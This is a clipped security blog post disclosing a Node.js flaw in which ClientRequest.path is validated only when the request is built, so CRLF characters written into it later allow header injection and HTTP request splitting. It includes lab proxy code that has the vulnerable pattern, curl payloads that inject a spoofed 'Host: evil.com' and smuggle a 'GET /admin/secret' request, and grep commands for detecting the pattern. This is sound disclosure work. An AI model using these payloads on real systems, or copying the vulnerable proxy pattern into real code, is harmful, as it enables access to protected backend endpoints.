---
title: "The Forgotten Bug: How a Node.js Core Design Flaw Enables HTTP Request Splitting"
source: "https://r3verii.github.io/cve/2026/02/27/nodejs-toctou.html"
author:
  - "Martino Spagnuolo"
published: 2026-02-27
created: 2026-02-28
description: "Deep dive into a TOCTOU vulnerability in Node.js’s ClientRequest.path that bypasses CRLF validation and enables Header Injection and HTTP Request Splitting across 7+ major HTTP libraries totaling 160M+ weekly downloads."
tags:
  - "clippings/articles"
  - "_inbox"
---
# The Forgotten Bug: How a Node.js Core Design Flaw Enables HTTP Request Splitting

![](https://r3verii.github.io/assets/2026-02-27-nodejs-toctou/cover.jpg)

> [!summary]+
> > The page details a Time-of-Check-Time-of-Use (TOCTOU) vulnerability in [JavaScript & NodeJS](../Dev,%20ICT%20&%20Cybersec/Dev,%20scripting%20&%20OS/JavaScript%20&%20NodeJS.md)'s `ClientRequest.path` that enables HTTP Request Splitting (and potentially [Request smuggling via CRLF injection](../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Exploiting%20Advanced%20Request%20Smuggling.md#Request%20smuggling%20via%20CRLF%20injection)).
> It explains how the `path` property is validated only at construction time, but remains a plain writable JavaScript property, allowing mutation with unescaped characters (like CRLF) before the request headers are flushed.
> This bypasses a 2018 fix (CVE-2018-12116) and can lead to header injection, body injection, or full request splitting.
> An audit identified seven popular Node.js libraries (e.g., node-http-proxy, http-proxy-middleware, superagent) with over 160 million combined weekly downloads that are vulnerable due to exposing the `ClientRequest` object before header flush.
> The Node.js security team classified it as \"not a vulnerability\" under their current threat model.
> The author urges the Node.js ecosystem to address this issue, providing detection methods and possible fixes, and calling for collaboration to identify more affected libraries and applications.

## 3\. The Root Cause: Anatomy of the TOCTOU

The vulnerability I found is a classic [TOCTOU (Time-of-Check-Time-of-Use)](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) bug.

```
              TIME ─────────────────────────────────────────────────────►
    ┌──────────────────┐         ┌─────────────────────┐        ┌──────────────────┐
    │  http.request()  │         │   TOCTOU WINDOW     │        │ _implicitHeader()│
    │                  │         │                     │        │                  │
    │  options.path    │         │  ClientRequest      │        │  this.path used  │
    │  is VALIDATED    │         │  is EXPOSED to      │        │  directly in     │
    │  against         │────────►│  user code via      │───────►│  HTTP request    │
    │  INVALID_PATH_   │         │  events/callbacks   │        │  line — NO       │
    │  REGEX           │         │                     │        │  re-validation   │
    │                  │         │  .path is a PLAIN   │        │                  │
    │  ✅✅ CHECK     │         │  WRITABLE property  │        │  ❌❌ USE       │
    └──────────────────┘         └─────────────────────┘        └──────────────────┘
                                          🡩
                                          |
                                  ┌─────────────────────┐
                                  │  ATTACKER MUTATES   │
                                  │  clientReq.path =   │
                                  │  "/x\r\n\r\nGET /"  │
                                  │                     │
                                  │  Validation is      │
                                  │  NEVER re-run       │
                                  └─────────────────────┘
```

In simple terms:

1. **CHECK**: When you call `http.request(options)`, Node.js validates `options.path` against `INVALID_PATH_REGEX`. If it contains CRLF characters (`\r`, `\n`) or characters outside `\u0021-\u00ff`, it throws an error. Good.
2. **WINDOW**: The resulting `ClientRequest` object has a `.path` property that is a **plain writable JavaScript property** — `this.path = options.path || '/'`. No setter. No `Object.defineProperty`. No `Proxy`. Any code with a reference to the object can write to it freely.
3. **USE**: When the request is actually sent (triggered by `.write()`, `.end()`, or `.pipe()`), the method `_implicitHeader()` reads `this.path` directly and concatenates it into the HTTP request line: `this.method + ' ' + this.path + ' HTTP/1.1\r\n'`. **No re-validation.**

The gap between step 1 and step 3 is the TOCTOU window. Any mutation of `.path` during this window bypasses all CRLF validation.

To demonstrate this vulnerability in practice, I set up a minimal but realistic lab: a proxy that rewrites paths using the most common pattern found in real-world code, and a backend that logs every request it receives.

### The Setup

**Backend** (`backend.js`) — a simple Express server that logs every incoming request:

```js
const express = require("express");

const app = express();
app.use(express.json());
r_idx = 0;

app.get("*", (req, res) => {
  console.log(`[${++r_idx}] ${req.method} ${req.path}`);
  res.json({
    ok: true,
    source: "target-server",
    method: req.method,
    url: req.originalUrl,
    path: req.path,
    query: req.query,
    headers: {
      host: req.headers.host,
      "x-proxy-test": req.headers["x-proxy-test"] || null,
    },
  });
});

app.post("*", (req, res) => {
  console.log(`[${++r_idx}] ${req.method} ${req.path}`);
  res.json({
    ok: true,
    source: "target-server",
    method: req.method,
    url: req.originalUrl,
    path: req.path,
    query: req.query,
    body: req.body,
    headers: {
      host: req.headers.host,
      "x-proxy-test": req.headers["x-proxy-test"] || null,
    },
  });
});

app.listen(4000, () => {
  console.log("Target server running on http://localhost:4000");
});
```

**Proxy** (`proxy.js`) — an Express proxy that extracts a catch-all parameter and assigns it to `proxyReq.path`:

```js
const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();

app.use('/proxy/:target(*)', createProxyMiddleware({
  target: 'http://backend:4000',
  changeOrigin: true,
  on: {
    proxyReq: (proxyReq, req) => {
      proxyReq.path = '/' + req.params.target;
      console.log(`[PROXY] ${req.method} ${req.originalUrl} -> ${proxyReq.path}`);
    }
  }
}));

app.listen(3000, '0.0.0.0', () => {
  console.log('Proxy running on http://0.0.0.0:3000');
  console.log('  Example: /proxy/hello');
});
```

This is a completely realistic pattern. The proxy takes a path from the URL (`:target` parameter), prepends `/`, and assigns it to `proxyReq.path`. This is exactly how dozens of real-world proxies handle path rewriting.

The problem: `req.params.target` comes directly from the user’s URL. Express decodes percent-encoded characters in route parameters. So `%0D%0A` in the URL becomes `\r\n` in `req.params.target`, which then flows into `proxyReq.path` — **after** `INVALID_PATH_REGEX` validation has already passed.

### Exploit: Header Injection

A single request with percent-encoded CRLF in the path:

```sh
curl "http://localhost:3000/proxy/hello%20HTTP/1.1%0D%0AX-Injected:%20true%0D%0AHost:%20evil.com%0D%0A%0D%0A"
```

The proxy decodes this and assigns to `proxyReq.path`:

```
/hello HTTP/1.1\r\nX-Injected: true\r\nHost: evil.com\r\n\r\n
```

The backend receives a request with the injected `X-Injected` header and a spoofed `Host`.

### Exploit: Full Request Splitting

```sh
curl "http://localhost:3000/proxy/hello%20HTTP/1.1%0D%0AHost:%20x%0D%0A%0D%0AGET%20/admin/secret%20HTTP/1.1%0D%0AHost:%20x%0D%0A%0D%0A"
```

The proxy sends **one** request. The backend logs **two**:

```
[1] GET /hello
[2] GET /admin/secret    ← this was never requested by the client
```

One curl command, two backend requests. The second request (`GET /admin/secret`) is entirely attacker-controlled and reaches the backend as an independent, authenticated request on the same TCP connection.

### How to Check Your Code

Search your codebase for these patterns:

```sh
# Proxy libraries (node-http-proxy, http-proxy-middleware)
grep -rn "proxyReq\.path\s*=" .
grep -rn "\.on.*proxyReq" .

# HTTP clients (superagent, request)
grep -rn "\.on.*'request'" . | grep -i "\.path\s*="
grep -rn "\.req\.path\s*=" .

# Generic — any ClientRequest mutation
grep -rn "clientReq\.path\s*=" .
grep -rn "\.path\s*=.*req\." .
```

If you find matches, check whether:

1. The value assigned to `.path` can be influenced by user input (query params, headers, URL segments)
2. The mutation happens after `http.request()` construction but before `.write()`/`.end()`/`.pipe()`

If both conditions are true, you likely have a request splitting vulnerability.